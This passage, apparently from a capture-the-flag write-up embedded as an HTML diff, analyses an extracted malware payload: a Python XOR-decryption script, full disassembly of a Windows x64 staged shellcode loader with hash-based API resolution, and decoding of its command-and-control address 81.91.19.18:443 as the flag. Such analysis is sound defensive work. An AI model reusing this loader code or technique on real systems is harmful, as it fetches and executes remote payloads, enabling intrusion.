+</span></span><span style="display:flex;"><span>    content <span style="color:#f92672">=</span> file<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Locate the shellcode start pattern</span>
+</span></span><span style="display:flex;"><span>index <span style="color:#f92672">=</span> content<span style="color:#f92672">.</span>find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x48\x31\xc9</span><span style="color:#e6db74">&#39;</span>)  <span style="color:#75715e"># xor rcx, rcx instruction</span>
+</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(<span style="color:#e6db74">&#34;e64ddc02b7bacb6f&#34;</span>)[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]  <span style="color:#75715e"># Reverse byte order for little-endian</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> content[index: index <span style="color:#f92672">+</span> <span style="color:#ae81ff">512</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;payload in hex:&#34;</span>)
+</span></span><span style="display:flex;"><span>print(payload<span style="color:#f92672">.</span>hex())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Save the raw encrypted payload</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;payload.bin&#39;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> file:
+</span></span><span style="display:flex;"><span>    file<span style="color:#f92672">.</span>write(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Decrypt the payload starting from offset 0x27</span>
+</span></span><span style="display:flex;"><span>decoded <span style="color:#f92672">=</span> xor(payload[<span style="color:#ae81ff">0x27</span>:], key)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Save the decrypted shellcode</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;decoded.bin&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> file:
+</span></span><span style="display:flex;"><span>    file<span style="color:#f92672">.</span>write(decoded)</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>The script successfully extracted and decrypted the shellcode, providing us with the actual malicious payload for further analysis. The decrypted shellcode could now be loaded into IDA Pro for comprehensive reverse engineering.</p>
+<h3 id="decrypted-shellcode-analysis" class="mt-6 mb-2 text-lg sm:text-xl text-white">
+    <span class="relative inline-block">
+      Decrypted Shellcode Analysis
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h3>
+<p>Loading the decrypted payload into IDA Pro revealed a sophisticated piece of shellcode. Let&rsquo;s see the complete disassembly first, then break it down section by section:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">assembly</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>                cld
+</span></span><span style="display:flex;"><span>                and     rsp, 0FFFFFFFFFFFFFFF0h
+</span></span><span style="display:flex;"><span>                call    sub_D6
+</span></span><span style="display:flex;"><span>; ---------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>                push    r9
+</span></span><span style="display:flex;"><span>                push    r8
+</span></span><span style="display:flex;"><span>                push    rdx
+</span></span><span style="display:flex;"><span>                push    rcx
+</span></span><span style="display:flex;"><span>                push    rsi
+</span></span><span style="display:flex;"><span>                xor     rdx, rdx
+</span></span><span style="display:flex;"><span>                mov     rdx, gs:[rdx+60h]
+</span></span><span style="display:flex;"><span>                mov     rdx, [rdx+18h]
+</span></span><span style="display:flex;"><span>                mov     rdx, [rdx+20h]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>loc_21:
+</span></span><span style="display:flex;"><span>                movzx   rcx, word ptr [rdx+4Ah]
+</span></span><span style="display:flex;"><span>                mov     rsi, [rdx+50h]
+</span></span><span style="display:flex;"><span>                xor     r9, r9
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>loc_2D:
+</span></span><span style="display:flex;"><span>                xor     rax, rax
+</span></span><span style="display:flex;"><span>                lodsb
+</span></span><span style="display:flex;"><span>                cmp     al, 61h
+</span></span><span style="display:flex;"><span>                jl      short loc_37
+</span></span><span style="display:flex;"><span>                sub     al, 20h
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>loc_37:
+</span></span><span style="display:flex;"><span>                ror     r9d, 0Dh
+</span></span><span style="display:flex;"><span>                add     r9d, eax
+</span></span><span style="display:flex;"><span>                loop    loc_2D
+</span></span><span style="display:flex;"><span>                push    rdx
+</span></span><span style="display:flex;"><span>                mov     rdx, [rdx+20h]
+</span></span><span style="display:flex;"><span>                push    r9
+</span></span><span style="display:flex;"><span>                mov     eax, [rdx+3Ch]
+</span></span><span style="display:flex;"><span>                add     rax, rdx
+</span></span><span style="display:flex;"><span>                cmp     word ptr [rax+18h], 20Bh
+</span></span><span style="display:flex;"><span>                jnz     loc_CB
+</span></span><span style="display:flex;"><span>                mov     eax, [rax+88h]
+</span></span><span style="display:flex;"><span>                test    rax, rax
+</span></span><span style="display:flex;"><span>                jz      short loc_CB
+</span></span><span style="display:flex;"><span>                add     rax, rdx
+</span></span><span style="display:flex;"><span>                mov     r8d, [rax+20h]
+</span></span><span style="display:flex;"><span>                mov     ecx, [rax+18h]
+</span></span><span style="display:flex;"><span>                add     r8, rdx
+</span></span><span style="display:flex;"><span>                push    rax
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>loc_72:
+</span></span><span style="display:flex;"><span>                jrcxz   loc_CA
+</span></span><span style="display:flex;"><span>                xor     r9, r9
+</span></span><span style="display:flex;"><span>                dec     rcx
+</span></span><span style="display:flex;"><span>                mov     esi, [r8+rcx*4]
+</span></span><span style="display:flex;"><span>                add     rsi, rdx
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>loc_81:
+</span></span><span style="display:flex;"><span>                xor     rax, rax
+</span></span><span style="display:flex;"><span>                lodsb
+</span></span><span style="display:flex;"><span>                ror     r9d, 0Dh
+</span></span><span style="display:flex;"><span>                add     r9d, eax
+</span></span><span style="display:flex;"><span>                cmp     al, ah
+</span></span><span style="display:flex;"><span>                jnz     short loc_81
+</span></span><span style="display:flex;"><span>                add     r9, [rsp+8]
+</span></span><span style="display:flex;"><span>                cmp     r9d, r10d
+</span></span><span style="display:flex;"><span>                jnz     short loc_72
+</span></span><span style="display:flex;"><span>                pop     rax
+</span></span><span style="display:flex;"><span>                mov     r8d, [rax+24h]
+</span></span><span style="display:flex;"><span>                add     r8, rdx
+</span></span><span style="display:flex;"><span>                mov     cx, [r8+rcx*2]
+</span></span><span style="display:flex;"><span>                mov     r8d, [rax+1Ch]
+</span></span><span style="display:flex;"><span>                add     r8, rdx
+</span></span><span style="display:flex;"><span>                mov     eax, [r8+rcx*4]
+</span></span><span style="display:flex;"><span>                add     rax, rdx
+</span></span><span style="display:flex;"><span>                pop     r8
+</span></span><span style="display:flex;"><span>                pop     r8
+</span></span><span style="display:flex;"><span>                pop     rsi
+</span></span><span style="display:flex;"><span>                pop     rcx
+</span></span><span style="display:flex;"><span>                pop     rdx
+</span></span><span style="display:flex;"><span>                pop     r8
+</span></span><span style="display:flex;"><span>                pop     r9
+</span></span><span style="display:flex;"><span>                pop     r10
+</span></span><span style="display:flex;"><span>                sub     rsp, 20h
+</span></span><span style="display:flex;"><span>                push    r10
+</span></span><span style="display:flex;"><span>                jmp     rax
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; ... (continuing with rest of shellcode)</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><h4 id="dynamic-api-resolution" class="mt-5 mb-2 text-base sm:text-lg text-white">
+    <span class="relative inline-block">
+      Dynamic API Resolution
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h4>
+<p>The initial section of the shellcode implements a <strong>dynamic API resolution</strong> mechanism. After the <code>call sub_D6</code> instruction, which places the return address (0xA) into <code>rbp</code>, the code beginning at offset 0xA performs the following operations:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">assembly</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>push    r9
+</span></span><span style="display:flex;"><span>push    r8  
+</span></span><span style="display:flex;"><span>push    rdx
+</span></span><span style="display:flex;"><span>push    rcx
+</span></span><span style="display:flex;"><span>push    rsi
+</span></span><span style="display:flex;"><span>xor     rdx, rdx
+</span></span><span style="display:flex;"><span>mov     rdx, gs:[rdx+60h]    ; Access Process Environment Block (PEB)
+</span></span><span style="display:flex;"><span>mov     rdx, [rdx+18h]       ; Access LoaderData  
+</span></span><span style="display:flex;"><span>mov     rdx, [rdx+20h]       ; Access InMemoryOrderModuleList</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>This code walks through the <strong>Process Environment Block (PEB)</strong> to enumerate loaded DLLs, then implements a custom hashing algorithm to resolve API functions by hash rather than by name. More details on this routine in the appendix.</p>
+<h4 id="main-payload-analysis" class="mt-5 mb-2 text-base sm:text-lg text-white">
+    <span class="relative inline-block">
+      Main Payload Analysis
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h4>
+<p>Now let&rsquo;s analyze the main payload starting from <code>sub_D6</code>. This function immediately performs <code>pop rbp</code>, storing the return address in <code>rbp</code> - this address points to the dynamic API resolution routine just described (more analysis on this routine later).</p>
+<p>The function proceeds with several API calls using the hash-based resolution mechanism. On Windows x64, the calling convention uses <code>rcx</code>, <code>rdx</code>, <code>r8</code>, and <code>r9</code> as the first four parameters.</p>
+<p><strong>First API Call - LoadLibraryA:</strong></p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">assembly</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>mov     r14, &#39;23_2sw&#39;        ; &#34;ws2_32&#34; string (reversed due to little-endian)
+</span></span><span style="display:flex;"><span>push    r14
+</span></span><span style="display:flex;"><span>mov     r14, rsp             ; R14 now points to &#34;ws2_32&#34; string
+</span></span><span style="display:flex;"><span>mov     rcx, r14             ; First parameter: DLL name
+</span></span><span style="display:flex;"><span>mov     r10d, 726774Ch       ; Hash for LoadLibraryA
+</span></span><span style="display:flex;"><span>call    rbp                  ; Call LoadLibraryA(&#34;ws2_32&#34;)</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p><strong>Second API Call - WSAStartup:</strong></p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">assembly</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>mov     rdx, r13             ; Second parameter: pointer to WSADATA structure
+</span></span><span style="display:flex;"><span>push    101h
+</span></span><span style="display:flex;"><span>pop     rcx                  ; First parameter: Winsock version
+</span></span><span style="display:flex;"><span>mov     r10d, 6B8029h        ; Hash for WSAStartup
+</span></span><span style="display:flex;"><span>call    rbp                  ; Call WSAStartup(0x101, lpWSAData)</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p><strong>Third API Call - socket:</strong></p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">assembly</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>push    rax                  ; Save previous return values
+</span></span><span style="display:flex;"><span>push    rax
+</span></span><span style="display:flex;"><span>xor     r9, r9               ; Fourth parameter: 0 (protocol, let system choose)
+</span></span><span style="display:flex;"><span>xor     r8, r8               ; Third parameter: 0 (protocol)
+</span></span><span style="display:flex;"><span>inc     rax
+</span></span><span style="display:flex;"><span>mov     rdx, rax             ; Second parameter: 1 (SOCK_STREAM)
+</span></span><span style="display:flex;"><span>inc     rax  
+</span></span><span style="display:flex;"><span>mov     rcx, rax             ; First parameter: 2 (AF_INET)
+</span></span><span style="display:flex;"><span>mov     r10d, 0E0DF0FEAh     ; Hash for socket
+</span></span><span style="display:flex;"><span>call    rbp                  ; Call socket(AF_INET, SOCK_STREAM, 0)
+</span></span><span style="display:flex;"><span>mov     rdi, rax             ; Store socket descriptor</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p><strong>Fourth API Call - connect (with retry loop):</strong></p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">assembly</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>push    10h
+</span></span><span style="display:flex;"><span>pop     r8                   ; Third parameter: sizeof(sockaddr_in) = 16
+</span></span><span style="display:flex;"><span>mov     rdx, r12             ; Second parameter: pointer to sockaddr_in structure
+</span></span><span style="display:flex;"><span>mov     rcx, rdi             ; First parameter: socket descriptor
+</span></span><span style="display:flex;"><span>mov     r10d, 6174A599h      ; Hash for connect
+</span></span><span style="display:flex;"><span>call    rbp                  ; Call connect(socket, sockaddr, 16)
+</span></span><span style="display:flex;"><span>test    eax, eax
+</span></span><span style="display:flex;"><span>jz      short loc_15E        ; If successful (return 0), continue
+</span></span><span style="display:flex;"><span>dec     r14                  ; Decrement retry counter (initially 10)
+</span></span><span style="display:flex;"><span>jnz     short loc_13E        ; If retries left, try again</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p><strong>Fifth API Call - recv (receive stage size):</strong></p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">assembly</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sub     rsp, 10h             ; Allocate 16 bytes on stack for buffer
+</span></span><span style="display:flex;"><span>mov     rdx, rsp             ; Second parameter: buffer pointer
+</span></span><span style="display:flex;"><span>xor     r9, r9               ; Fourth parameter: 0 (no flags)
+</span></span><span style="display:flex;"><span>push    4
+</span></span><span style="display:flex;"><span>pop     r8                   ; Third parameter: 4 bytes to receive
+</span></span><span style="display:flex;"><span>mov     rcx, rdi             ; First parameter: socket descriptor
+</span></span><span style="display:flex;"><span>mov     r10d, 5FC8D902h      ; Hash for recv
+</span></span><span style="display:flex;"><span>call    rbp                  ; Call recv(socket, buffer, 4, 0)</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p><strong>Sixth API Call - VirtualAlloc:</strong></p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">assembly</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>pop     rsi                  ; Get the 4-byte size value received
+</span></span><span style="display:flex;"><span>push    40h
+</span></span><span style="display:flex;"><span>pop     r9                   ; Fourth parameter: PAGE_EXECUTE_READWRITE
+</span></span><span style="display:flex;"><span>push    1000h
+</span></span><span style="display:flex;"><span>pop     r8                   ; Third parameter: MEM_COMMIT
+</span></span><span style="display:flex;"><span>mov     rdx, rsi             ; Second parameter: size (from recv)
+</span></span><span style="display:flex;"><span>xor     rcx, rcx             ; First parameter: NULL (let system choose address)
+</span></span><span style="display:flex;"><span>mov     r10d, 0E553A458h     ; Hash for VirtualAlloc
+</span></span><span style="display:flex;"><span>call    rbp                  ; Call VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p><strong>Seventh API Call - recv (receive shellcode):</strong></p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">assembly</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>xor     r9, r9               ; Fourth parameter: 0 (no flags)
+</span></span><span style="display:flex;"><span>mov     r8, rsi              ; Third parameter: number of bytes to receive
+</span></span><span style="display:flex;"><span>mov     rdx, rbx             ; Second parameter: allocated memory address
+</span></span><span style="display:flex;"><span>mov     rcx, rdi             ; First parameter: socket descriptor
+</span></span><span style="display:flex;"><span>mov     r10d, 5FC8D902h      ; Hash for recv
+</span></span><span style="display:flex;"><span>call    rbp                  ; Call recv(socket, allocated_memory, size, 0)</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>The shellcode implements a <strong>stage-1 loader</strong> that:</p>
+<ol>
+<li>Establishes a network connection to a remote server</li>
+<li>Receives the size of the next stage payload</li>
+<li>Allocates executable memory for the payload</li>
+<li>Downloads and executes the second-stage payload</li>
+</ol>
+<p>This is a classic <strong>staged payload</strong> architecture commonly used in penetration testing tools and malware, where the initial payload is kept minimal to reduce detection, and the main functionality is delivered in subsequent stages.</p>
+<h3 id="challenge-solution" class="mt-6 mb-2 text-lg sm:text-xl text-white">
+    <span class="relative inline-block">
+      Challenge Solution
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h3>
+<p>With the shellcode fully analyzed, the final step was to extract the connection target. Examining the hardcoded <code>SOCKADDR_IN</code> structure in the payload:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">assembly</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>mov     r12, 515B1312BB010002h  ; SOCKADDR_IN structure bytes</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>Breaking down this 64-bit value:</p>
+<ul>
+<li><code>0002</code> = <code>AF_INET</code> (address family)</li>
+<li><code>01BB</code> = port 443 in network byte order (big-endian)</li>
+<li><code>12135B51</code> = IP address 81.91.19.18 in network byte order</li>
+</ul>
+<p>The shellcode attempts to connect to <strong>81.91.19.18:443</strong>, which represents the command and control server for this staged payload.</p>
+<p><strong>Flag: <code>81.91.19.18:443</code></strong></p>
+<hr>
+<h2 id="appendix-hash-based-api-resolution-analysis" class="mt-8 mb-3 text-xl sm:text-2xl text-white">
+    <span class="relative inline-block">
+      Appendix: Hash-Based API Resolution Analysis
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h2>
+<p>One of the most interesting aspects of this shellcode is its  API resolution mechanism. Instead of importing functions directly, it dynamically resolves Windows API functions using a custom hashing algorithm. This technique is commonly employed by malware to evade static analysis.</p>
+<h3 id="the-api-resolution-routine" class="mt-6 mb-2 text-lg sm:text-xl text-white">
+    <span class="relative inline-block">
+      The API Resolution Routine
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h3>
+<p>Here&rsquo;s the complete API resolution routine with detailed comments:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">assembly</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>; Entry point <span style="color:#f92672">-</span> save registers <span style="color:#f92672">and</span> initialize
+</span></span><span style="display:flex;"><span>push    r9
+</span></span><span style="display:flex;"><span>push    r8
+</span></span><span style="display:flex;"><span>push    rdx
+</span></span><span style="display:flex;"><span>push    rcx
+</span></span><span style="display:flex;"><span>push    rsi
+</span></span><span style="display:flex;"><span>xor     rdx, rdx
+</span></span><span style="display:flex;"><span>mov     rdx, gs:[rdx<span style="color:#f92672">+</span><span style="color:#ae81ff">60</span>h]        ; Access Process <span style="color:#a6e22e">Environment</span> Block (PEB)
+</span></span><span style="display:flex;"><span>mov     rdx, [rdx<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>h]           ; Access PEB_LDR_DATA<span style="color:#f92672">.</span>LoaderData
+</span></span><span style="display:flex;"><span>mov     rdx, [rdx<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span>h]           ; Access InMemoryOrderModuleList<span style="color:#f92672">.</span>Flink
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; Main DLL enumeration loop
+</span></span><span style="display:flex;"><span>loc_21:
+</span></span><span style="display:flex;"><span>movzx   rcx, word ptr [rdx<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>Ah]  ; Read BaseDllName<span style="color:#f92672">.</span>MaximumLength from LDR_DATA_TABLE_ENTRY
+</span></span><span style="display:flex;"><span>mov     rsi, [rdx<span style="color:#f92672">+</span><span style="color:#ae81ff">50</span>h]           ; Read BaseDllName<span style="color:#f92672">.</span>Buffer pointer
+</span></span><span style="display:flex;"><span>xor     r9, r9                   ; Initialize hash accumulator
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; DLL name hashing loop
+</span></span><span style="display:flex;"><span>loc_2D:
+</span></span><span style="display:flex;"><span>xor     rax, rax                 ; Clear RAX
+</span></span><span style="display:flex;"><span>lodsb                            ; Load next character from DLL name, increment RSI
+</span></span><span style="display:flex;"><span>cmp     al, <span style="color:#ae81ff">61</span>h                  ; Compare with <span style="color:#e6db74">&#39;a&#39;</span> (<span style="color:#ae81ff">0x61</span>)
+</span></span><span style="display:flex;"><span>jl      short loc_37             ; If less than <span style="color:#e6db74">&#39;a&#39;</span>, skip uppercase conversion
+</span></span><span style="display:flex;"><span>sub     al, <span style="color:#ae81ff">20</span>h                  ; Convert lowercase to uppercase (subtract <span style="color:#ae81ff">0x20</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>loc_37:
